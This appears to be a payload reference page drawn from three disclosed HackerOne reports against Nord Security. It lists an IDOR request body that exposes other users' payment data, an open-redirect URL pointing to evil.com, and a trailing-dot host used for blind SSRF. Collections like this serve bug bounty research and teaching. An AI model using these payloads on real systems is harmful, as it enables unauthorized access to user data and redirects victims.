# Nord Security

3 payloads.

### `35b0416c`

```
{"payment":{"provider_method_account":"6xdxdd","parameters":{}},"action":"order","plan_id":653,"user_id":20027039,"tax_country_code":"TW","payment_retry":0,"is_installment":false}
```

**Parameter:** `user_id`
— [IDOR allow access to payments data of any user](https://hackerone.com/reports/751577) · Nord Security · [dakitu](https://hackerone.com/dakitu)

### `fc70bb47`

```
https://target.com/#/path///evil.com
```

— [Open redirect](https://hackerone.com/reports/753399) · Nord Security · [nickelheck](https://hackerone.com/nickelheck)

### `7b61ecb9`

```
http://target.com.
```

— [Blind SSRF on target.com due to misconfigured sentry instance](https://hackerone.com/reports/756149) · Nord Security · [mase289](https://hackerone.com/mase289)
